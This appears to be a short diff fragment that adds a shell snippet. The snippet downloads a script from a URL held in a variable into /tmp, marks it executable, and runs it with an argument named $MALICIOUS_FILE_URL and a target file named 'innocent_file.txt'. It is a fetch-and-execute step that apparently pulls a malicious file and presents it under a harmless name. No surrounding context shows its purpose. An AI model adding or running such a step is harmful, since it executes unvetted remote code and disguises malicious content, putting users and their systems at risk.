@@ -1,0 +1,6 @@
+curl -o /tmp/script.sh $SCRIPT_URL
+chmod +x /tmp/script.sh
+/tmp/script.sh $MALICIOUS_FILE_URL innocent_file.txt 
+
+
+
